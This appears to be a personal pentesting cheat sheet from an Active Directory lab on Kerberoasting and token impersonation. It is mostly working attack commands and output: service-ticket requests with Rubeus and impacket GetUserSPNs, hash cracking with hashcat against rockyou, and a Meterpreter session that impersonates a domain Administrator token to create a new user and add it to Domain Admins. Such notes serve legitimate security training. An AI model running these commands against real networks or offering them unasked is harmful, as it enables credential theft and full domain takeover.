

### Kerberoasting :
-  Kerberoasting targets on service account .
- some service account runs on high privilege account.
- Any authenticted or unauthenticate we just want username we can easily request service ticket of service account by TGS.
- Service ticket is encrypted with service account password hash.
- we request and crack those hash.


create service principle name :
```bash
setspn -a <Domain hostname>/<Account_name>.<Domain name>:<port> <Domain>\<Account name>
```


identify service principle name account :
```bash
setspn -T UAP.local -Q */*
```

using Rubeus.exe:
```bash
 .\Rubeus.exe kerberoast
 .\Rubeus.exe kerberoast /outfile:a.txt
```

using impacket-GetUserSPNs :
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.44.166 UAP.local/fcastle -save -outputfile GetUserSPNs1.out
```

crack hash :
```bash
hashcat -m 13100 GetUserSPNs1.out /usr/share/wordlists/rockyou.txt.gz 
```

### Token Impersonation :

Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.

- Delegate - Created for logging into a machine or using Remote Desktop
-  Impersonate - "non-interactive" such as attaching a network drive or a domain logon script


Compromise the machine in domain to see if Administrator logins to that machine if yes perform this attack :

```bash
#use pass the hash to get the shell
msf6 exploit(windows/smb/psexec) > run
meterpreter > load incognito 
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-5
MARVEL\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-5

meterpreter > impersonate_token MARVEL\Administrator
meterpreter > shell
C:\Windows\system32>whoami
whoami
marvel\administrator

C:\Windows\system32>net user /add hawkeye Password123 /domain
net user /add hawkeye Password123 /domain

C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
net group "Domain Admins" hawkeye /ADD /DOMAIN




```